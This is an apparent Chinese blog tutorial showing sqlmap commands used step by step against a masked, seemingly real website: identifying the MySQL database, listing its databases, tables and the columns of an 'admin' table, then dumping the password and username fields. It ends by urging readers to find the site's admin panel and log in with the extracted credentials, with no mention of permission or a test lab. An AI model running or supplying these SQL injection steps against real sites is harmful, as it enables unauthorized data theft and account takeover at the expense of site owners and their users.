---
title: sqlmap使用实例
date: 2016-02-18 16:22:09
tags: [Web漏洞]
categories: [网络安全]
---

## 1. 确定是什么数据库

    sqlmap -u "http://********/about.php?id=5"

**参数:**
    -u: 指定注入点url

**结果:**
![1.png](http://ww3.sinaimg.cn/large/5e515a93jw1f13lc1yxe4j20hw07hq4a.jpg)

如图所示: 数据库是 `MySQL`


<!-- more -->


## 2. 查看当前站点有那些数据库 

    sqlmap -u "http://*********/about.php?id=5" --dbs

**参数**：
    --dbs: dbs前面有两条杠，请看清楚。

**结果:**
![2.png](http://ww1.sinaimg.cn/large/5e515a93jw1f13lbsa2y1j20hz07bta1.jpg)

如图所示： 有 `dbracpro28` 和 `information_schema`两个数据库

## 3. 查看`dbracpro28`数据库中有那些数据表

    sqlmap -u "http://*********/about.php?id=5" --tables -D "dbracpro28"

**参数**：
    --tables: 列出表
    -D: 指定具体数据库 

**结果:**
![3.png](http://ww4.sinaimg.cn/large/5e515a93jw1f13lbhloskj20hz0a875r.jpg)

如图所示: `dbracpro28` 数据看有 34 个表

## 4. 查看 `dbracpro28`数据库中的`admin`表中有那些数据段

    sqlmap -u "http://*********/about.php?id=5" --columns -T "admin"  -D "dbracpro28"

**参数**：
    --columns: 列出字段
    -D: 指定具体数据库
    -T: 指定表 

**结果:**
![4.png](http://ww3.sinaimg.cn/large/5e515a93jw1f13lb6r6trj20i109zwg7.jpg)

如图所示: `admin` 表中有以上 4 个字段

## 5. 查看 `dbracpro28`数据库中的`admin`表中`pwd`和`usernc` 里那些值

    sqlmap -u "http://*********/about.php?id=5" --dump -C "pwd, usernc"  -T "admin"  -D "dbracpro28"

**参数**：
    --dump: 将结果导出
    -D: 指定具体数据库
    -T: 指定表 
    -C: 指定字段

**结果:**
![5.png](http://ww1.sinaimg.cn/large/5e515a93jw1f13lagqwekj20hw07hq4a.jpg)

如图所示: `userna`, 和 `pwd` 就被我们扫出来啦~ 然后找到后台, 用它们愉快的登陆吧~~~ ：）